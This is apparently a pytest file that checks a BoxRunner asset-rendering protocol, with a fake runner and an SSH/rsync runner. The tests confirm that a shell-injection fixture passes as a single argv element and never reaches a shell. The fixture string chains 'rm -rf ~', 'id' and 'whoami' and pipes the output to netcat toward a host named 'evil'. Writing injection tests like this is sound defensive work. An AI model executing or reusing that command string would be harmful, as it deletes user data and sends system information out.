"""Tests for the asset-bus BoxRunner protocol and FakeBoxRunner (T-008)."""

from __future__ import annotations

import json
import socket
import subprocess
import wave
from pathlib import Path
from collections.abc import Sequence
from typing import Any

import pytest

from promptclaw.asset_bus import (
    BoxRunner,
    BoxRunResult,
    FakeBoxRunner,
    SSHBoxRunner,
)


INJECTION_FIXTURE = "moody forest; rm -rf ~ && echo $(id) `whoami` | nc evil 1 > /tmp/x"


@pytest.fixture(autouse=True)
def _block_network(monkeypatch: pytest.MonkeyPatch) -> None:
    """Make every socket attempt in these tests an immediate, loud failure."""

    def _refuse(*args: Any, **kwargs: Any) -> None:
        raise RuntimeError("network access is not allowed in unit tests")

    monkeypatch.setattr(socket, "socket", _refuse)
    monkeypatch.setattr(socket, "create_connection", _refuse)


def test_fake_box_runner_satisfies_protocol() -> None:
    fake = FakeBoxRunner()
    assert isinstance(fake, BoxRunner)


def test_fake_box_runner_materializes_configured_artifacts(tmp_path: Path) -> None:
    fake = FakeBoxRunner(
        exit_status=0,
        artifacts=[
            ("image-0.png", b"\x89PNG\r\n\x1a\nfake-bytes"),
            ("image-1.png", b"second-fake"),
        ],
    )

    result = fake.run(["asset_render_image", "--prompt", "x"], output_dir=tmp_path)

    assert isinstance(result, BoxRunResult)
    assert result.exit_status == 0
    assert len(result.artifacts) == 2
    assert (tmp_path / "image-0.png").read_bytes() == b"\x89PNG\r\n\x1a\nfake-bytes"
    assert (tmp_path / "image-1.png").read_bytes() == b"second-fake"
    assert set(result.artifacts) == {tmp_path / "image-0.png", tmp_path / "image-1.png"}


def test_fake_box_runner_returns_configured_exit_status(tmp_path: Path) -> None:
    fake = FakeBoxRunner(exit_status=7)

    result = fake.run(["asset_render_image"], output_dir=tmp_path)

    assert result.exit_status == 7
    assert result.artifacts == ()


def test_fake_box_runner_records_argv_verbatim(tmp_path: Path) -> None:
    fake = FakeBoxRunner()
    argv = ["asset_render_music", "--scene", INJECTION_FIXTURE, "--duration", "30"]

    fake.run(argv, output_dir=tmp_path)
    fake.run(["asset_render_image", "--prompt", "two"], output_dir=tmp_path)

    assert len(fake.calls) == 2
    first_argv, first_dir = fake.calls[0]
    assert first_argv == tuple(argv)
    assert first_dir == tmp_path
    # The injection fixture survives as one argv element — not split on ';' or '&&'.
    assert first_argv.count(INJECTION_FIXTURE) == 1
    second_argv, _ = fake.calls[1]
    assert second_argv == ("asset_render_image", "--prompt", "two")


def test_fake_box_runner_creates_missing_output_dir(tmp_path: Path) -> None:
    nested = tmp_path / "deliverables" / "req-abc"
    fake = FakeBoxRunner(artifacts=[("out.wav", b"riff")])

    result = fake.run(["asset_render_music"], output_dir=nested)

    assert nested.is_dir()
    assert (nested / "out.wav").read_bytes() == b"riff"
    assert result.artifacts == (nested / "out.wav",)


def test_fake_box_runner_reproduces_asset_render_music_output_contract(
    tmp_path: Path,
) -> None:
    fake = FakeBoxRunner()
    argv = [
        "asset_render_music",
        "--scene",
        INJECTION_FIXTURE,
        "--mood",
        "tense",
        "--mood",
        "cold",
        "--duration",
        "4.5",
        "--loopable",
        "--output",
        "stakeout-loop.wav",
    ]

    result = fake.run(argv, output_dir=tmp_path)

    target = tmp_path / "stakeout-loop.wav"
    assert result.exit_status == 0
    assert result.artifacts == (target,)
    assert fake.calls[-1] == (tuple(argv), tmp_path)
    assert target.read_bytes().startswith(b"RIFF")
    with wave.open(str(target), "rb") as handle:
        assert handle.getnchannels() == 1
        assert handle.getsampwidth() == 2
        assert handle.getframerate() == 8000
        assert handle.getnframes() > 0


def test_fake_box_runner_passes_stdout_and_stderr_through(tmp_path: Path) -> None:
    fake = FakeBoxRunner(stdout="rendered 1 image", stderr="warning: clipped")

    result = fake.run(["asset_render_image"], output_dir=tmp_path)

    assert result.stdout == "rendered 1 image"
    assert result.stderr == "warning: clipped"


def test_ssh_box_runner_invokes_ssh_and_rsync_as_argv_lists(tmp_path: Path) -> None:
    output_dir = tmp_path / "deliverables"
    calls: list[tuple[Sequence[str] | str, dict[str, Any]]] = []

    def fake_run(
        args: Sequence[str] | str,
        **kwargs: Any,
    ) -> subprocess.CompletedProcess[str]:
        calls.append((args, kwargs))
        assert isinstance(args, list)
        assert kwargs.get("shell") is False
        if args[0] == "rsync":
            destination = Path(args[-1])
            destination.mkdir(parents=True, exist_ok=True)
            (destination / "image-0.png").write_bytes(b"fake-png")
        return subprocess.CompletedProcess(args, 0, stdout="transport ok", stderr="")

    runner = SSHBoxRunner(
        host="cypherclaw",
        remote_output_root="/tmp/deniable-asset-bus",
        run_id_factory=lambda: "run-abc123",
        subprocess_run=fake_run,
    )

    result = runner.run(["asset_render_image", "--prompt", "plain"], output_dir=output_dir)

    assert calls[0][0] == [
        "ssh",
        "-o",
        "BatchMode=yes",
        "cypherclaw",
        "python3",
        "-m",
        "promptclaw.asset_bus.remote_exec",
        "--output-dir",
        "/tmp/deniable-asset-bus/run-abc123",
    ]
    assert calls[1][0] == [
        "rsync",
        "-a",
        "--",
        "cypherclaw:/tmp/deniable-asset-bus/run-abc123/",
        f"{output_dir}/",
    ]
    assert result.exit_status == 0
    assert result.artifacts == (output_dir / "image-0.png",)


def test_ssh_box_runner_serializes_injection_fixture_as_verbatim_argv_element(
    tmp_path: Path,
) -> None:
    calls: list[tuple[Sequence[str] | str, dict[str, Any]]] = []

    def fake_run(
        args: Sequence[str] | str,
        **kwargs: Any,
    ) -> subprocess.CompletedProcess[str]:
        calls.append((args, kwargs))
        assert isinstance(args, list)
        assert kwargs.get("shell") is False
        return subprocess.CompletedProcess(args, 0, stdout="", stderr="")

    argv = ["asset_render_music", "--scene", INJECTION_FIXTURE, "--duration", "30"]
    runner = SSHBoxRunner(
        host="cypherclaw",
        remote_output_root="/tmp/deniable-asset-bus",
        run_id_factory=lambda: "run-injection",
        subprocess_run=fake_run,
    )

    runner.run(argv, output_dir=tmp_path / "deliverables")

    ssh_args, ssh_kwargs = calls[0]
    rsync_args, _ = calls[1]
    assert isinstance(ssh_args, list)
    assert isinstance(rsync_args, list)
    assert all(INJECTION_FIXTURE not in arg for arg in ssh_args)
    assert all(INJECTION_FIXTURE not in arg for arg in rsync_args)
    payload = json.loads(ssh_kwargs["input"])
    assert payload["argv"] == argv
    assert payload["argv"].count(INJECTION_FIXTURE) == 1


def test_ssh_box_runner_rejects_invalid_argv_before_subprocess(tmp_path: Path) -> None:
    calls: list[tuple[Sequence[str] | str, dict[str, Any]]] = []

    def fake_run(
        args: Sequence[str] | str,
        **kwargs: Any,
    ) -> subprocess.CompletedProcess[str]:
        calls.append((args, kwargs))
        return subprocess.CompletedProcess(args, 0, stdout="", stderr="")

    runner = SSHBoxRunner(
        host="cypherclaw",
        remote_output_root="/tmp/deniable-asset-bus",
        subprocess_run=fake_run,
    )

    with pytest.raises(ValueError, match="NUL"):
        runner.run(["asset_render_image", "bad\x00value"], output_dir=tmp_path)

    assert calls == []
